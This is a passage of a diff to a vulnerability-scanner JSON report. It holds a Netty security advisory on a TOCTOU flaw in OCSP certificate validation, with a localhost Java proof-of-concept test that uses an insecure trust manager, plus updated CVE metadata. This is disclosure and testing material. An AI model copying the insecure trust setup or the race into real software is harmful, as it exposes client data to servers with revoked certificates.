receivedData.add(msg.toString(CharsetUtil.UTF_8));\n                                    dataReceivedLatch.countDown();\n                                }\n                            });\n                        }\n                    })\n                    .bind(8080)\n                    .sync()\n                    .channel();\n\n            SslContext clientSslCtx = SslContextBuilder.forClient()\n                    .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                    .build();\n\n            DnsNameResolver resolver = OcspServerCertificateValidator.createDefaultResolver(mockTransport);\n            Channel clientChannel = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer\u003cSocketChannel\u003e() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(clientSslCtx.newHandler(ch.alloc(), \"127.0.0.1\", 8080));\n                            ch.pipeline().addLast(new OcspServerCertificateValidator(true, false, mockTransport, resolver));\n                            ch.pipeline().addLast(new ChannelInboundHandlerAdapter() {\n                                @Override\n                                public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n                                    if (evt instanceof SslHandshakeCompletionEvent) {\n                                        SslHandshakeCompletionEvent sslEvent = (SslHandshakeCompletionEvent) evt;\n                                        if (sslEvent.isSuccess()) {\n                                            ctx.writeAndFlush(Unpooled.copiedBuffer(\"SECRET_DATA\", CharsetUtil.UTF_8));\n                                        }\n                                    }\n                                    ctx.fireUserEventTriggered(evt);\n                                }\n                            });\n                        }\n                    })\n                    .connect(\"127.0.0.1\", 8080)\n                    .sync()\n                    .channel();\n\n            assertTrue(clientChannel.closeFuture().await(5, TimeUnit.SECONDS));\n\n            Thread.sleep(200);\n\n            assertFalse(receivedData.contains(\"SECRET_DATA\"), \"Server should not receive the data.\");\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n```\n\n### Impact\nTOCTOU. Client applications relying on OcspServerCertificateValidator to enforce server certificate revocation are impacted. A malicious server with a revoked certificate can successfully establish a TLS connection and receive sensitive application data from the client (or send malicious data to it) during the window between the TLS handshake completing and the asynchronous OCSP check failing.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-wc96-39fc-566f"
+          ]
         },
         {
           "VulnerabilityID": "CVE-2026-46718",
@@ -39147,7 +39973,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-46718"
           ],
           "PublishedDate": "2026-06-02T10:16:25.377Z",
-          "LastModifiedDate": "2026-06-17T10:53:51.41Z"
+          "LastModifiedDate": "2026-07-22T19:10:00.12Z"
         },
         {
           "VulnerabilityID": "CVE-2025-48977",
@@ -40008,12 +40834,14 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:38878",
+            "https://access.redhat.com/errata/RHSA-2026:38995",
             "https://access.redhat.com/security/cve/CVE-2026-39822",
+            "https://bugzilla.redhat.com/2480756",
+            "https://bugzilla.redhat.com/2484207",
             "https://bugzilla.redhat.com/2498152",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2498152",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822",
-            "https://errata.almalinux.org/9/ALSA-2026-38878.html",
+            "https://errata.almalinux.org/8/ALSA-2026-38995.html",
             "https://errata.rockylinux.org/RLSA-2026:38878",
             "https://go.dev/cl/797880",
             "https://go.dev/issue/79005",
